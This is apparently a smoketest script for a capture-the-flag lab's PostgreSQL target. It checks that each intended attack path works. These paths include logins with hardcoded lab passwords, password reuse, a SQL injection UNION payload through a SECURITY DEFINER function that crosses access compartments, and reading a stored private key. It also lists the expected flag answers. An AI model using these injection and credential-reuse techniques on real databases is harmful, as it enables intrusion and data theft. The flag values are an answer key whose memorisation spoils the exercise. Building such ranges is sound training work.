#!/usr/bin/env bash
# A8 Research Database smoketest.
#
# Runs every flag path from an attacker's perspective via the a3-intranet
# pivot (A8 is on lab VLAN 30, not reachable from a14-kali directly).
# Uses psql client (bundled in a3 Dockerfile as pivot-host tooling).
#
# Usage (from the range host):
#     docker cp smoketest.sh a3-intranet:/tmp/a8-smoke.sh
#     docker exec a3-intranet bash /tmp/a8-smoke.sh
#
# Exits 0 on full pass, 1 on any failure.

set -u

HOST="${A8_HOST:-researchdb.boreas.local}"
DB="${A8_DB:-postgres}"

EXPECTED_FLAG_21="FLAG{4b9e2a7d0c8f1365}"
EXPECTED_FLAG_27="FLAG{6d1a8f3c7e0b4952}"
EXPECTED_FLAG_28="FLAG{a3f7d9e1c0b52846}"

FAIL=0
pass() { echo "  [PASS] $1"; }
fail() { echo "  [FAIL] $1"; FAIL=$((FAIL + 1)); }
check_flag() {
    local label="$1" expected="$2" actual="$3"
    if [[ "$actual" == *"$expected"* ]]; then
        pass "$label = $expected"
    else
        fail "$label expected=$expected got='$actual'"
    fi
}

psql_q() {
    local user="$1" pass="$2"
    shift 2
    PGPASSWORD="$pass" psql -h "$HOST" -U "$user" -d "$DB" -At -c "$*" 2>&1
}

echo "A8 smoketest - target=$HOST db=$DB"

echo
echo "--- Wait for postgres ready ---"
ready=0
for i in $(seq 1 30); do
    if psql_q lab_general 'LabGen2025!' "SELECT 1" 2>/dev/null | grep -q '^1$'; then
        pass "postgres accepting connections"
        ready=1
        break
    fi
    sleep 1
done
(( ready == 1 )) || fail "postgres never became ready"

echo
echo "--- lab_general credential from A3 /.env works ---"
psql_q lab_general 'LabGen2025!' "SELECT current_user" | grep -q '^lab_general$' \
    && pass "lab_general authenticates (A3 /.env discovery path)" \
    || fail "lab_general auth failed"

echo
echo "--- Compartment isolation: lab_general denied on compartment_b/c ---"
err_b="$(psql_q lab_general 'LabGen2025!' "SELECT count(*) FROM compartment_b.effector_systems")"
grep -q 'permission denied' <<<"$err_b" && pass "lab_general denied on compartment_b" \
    || fail "lab_general can read compartment_b (isolation broken): $err_b"
err_c="$(psql_q lab_general 'LabGen2025!' "SELECT count(*) FROM compartment_c.assembly_log")"
grep -q 'permission denied' <<<"$err_c" && pass "lab_general denied on compartment_c" \
    || fail "lab_general can read compartment_c: $err_c"

echo
echo "--- Flag 21: compartment_a.structural_specs frame_dorsal_plate ---"
flag21="$(psql_q lab_general 'LabGen2025!' \
    "SELECT notes FROM compartment_a.structural_specs WHERE component = 'frame_dorsal_plate'")"
check_flag "flag 21" "$EXPECTED_FLAG_21" "$flag21"

specs_120m="$(psql_q lab_general 'LabGen2025!' \
    "SELECT height_m FROM compartment_a.structural_specs WHERE component = 'primary_frame'")"
[[ "$specs_120m" == "120.4" ]] && pass "structural_specs: primary_frame height = 120.4m (A6 narrative)" \
    || fail "primary_frame height wrong: got '$specs_120m'"

echo
echo "--- Flag 27 path A: vasik AD password reuse (multi-compartment user) ---"
vasik_auth="$(psql_q vasik 'Reactor#Core9' "SELECT current_user")"
if grep -q '^vasik$' <<<"$vasik_auth"; then
    pass "vasik authenticates with A1/A2/A6 AD password"
    flag27a="$(psql_q vasik 'Reactor#Core9' \
        "SELECT serial_number FROM compartment_b.effector_systems WHERE system_type = 'directed_energy'")"
    check_flag "flag 27 via vasik direct" "$EXPECTED_FLAG_27" "$flag27a"
else
    fail "vasik auth failed: $vasik_auth"
fi

echo
echo "--- Flag 27 path B: SECURITY DEFINER SQLi as lab_general ---"
INJ="x'' UNION SELECT serial_number::text, system_name, system_type FROM compartment_b.effector_systems--"
sqli_out="$(psql_q lab_general 'LabGen2025!' \
    "SELECT * FROM research_public.search_research('${INJ}')")"
flag27b="$(grep -oE 'FLAG\{[a-f0-9]+\}' <<<"$sqli_out" | head -1)"
check_flag "flag 27 via SECURITY DEFINER SQLi" "$EXPECTED_FLAG_27" "$flag27b"
grep -q 'SECURITY DEFINER' <<<"$(psql_q lab_general 'LabGen2025!' \
    "SELECT pg_get_functiondef(p.oid) FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace WHERE n.nspname='research_public' AND p.proname='search_research'")" \
    && pass "search_research is SECURITY DEFINER (crosses compartment boundary)" \
    || fail "search_research is not SECURITY DEFINER"

echo
echo "--- Flag 28: compartment_c.assembly_log JSONB nested ---"
mfg_auth="$(psql_q lab_mfg 'Mfg2025!' "SELECT current_user")"
grep -q '^lab_mfg$' <<<"$mfg_auth" && pass "lab_mfg authenticates (A6 .pgpass pivot)" \
    || fail "lab_mfg auth failed"
flag28="$(psql_q lab_mfg 'Mfg2025!' \
    "SELECT metadata->'integration'->>'flag' FROM compartment_c.assembly_log WHERE metadata ? 'integration'")"
check_flag "flag 28 via JSONB path integration.flag" "$EXPECTED_FLAG_28" "$flag28"
pending_count="$(psql_q lab_mfg 'Mfg2025!' \
    "SELECT count(*) FROM compartment_c.assembly_log WHERE status ILIKE '%PENDING%'")"
(( pending_count >= 2 )) && pass "assembly_log has >=2 PENDING rows (reactor + combat AI)" \
    || fail "expected >=2 PENDING subsystems, got $pending_count"

echo
echo "--- A13 override code piece AL42 in compartment_c JSONB ---"
al42="$(psql_q lab_mfg 'Mfg2025!' \
    "SELECT metadata->'integration'->>'code' FROM compartment_c.assembly_log WHERE metadata ? 'integration'")"
[[ "$al42" == "AL42" ]] && pass "integration code AL42 present (A13 override piece)" \
    || fail "AL42 missing: got '$al42'"

echo
echo "--- A6 flag 30 chain: Vasik GPG private key blob in compartment_b.key_storage ---"
blob_len="$(psql_q vasik 'Reactor#Core9' \
    "SELECT length(key_data) FROM compartment_b.key_storage WHERE key_owner = 'e.vasik'")"
if [[ -n "$blob_len" && "$blob_len" -gt 1000 ]]; then
    pass "vasik GPG private key blob present (len=$blob_len)"
else
    fail "GPG key blob missing or too short: '$blob_len'"
fi

echo
echo "--- lab_mfg denied on compartment_b ---"
err_mfg_b="$(psql_q lab_mfg 'Mfg2025!' "SELECT count(*) FROM compartment_b.effector_systems")"
grep -q 'permission denied' <<<"$err_mfg_b" && pass "lab_mfg denied on compartment_b (weapons isolation)" \
    || fail "lab_mfg can read compartment_b"

echo
if (( FAIL == 0 )); then
    echo "A8 smoketest: PASS"
    exit 0
else
    echo "A8 smoketest: FAIL ($FAIL failure(s))"
    exit 1
fi
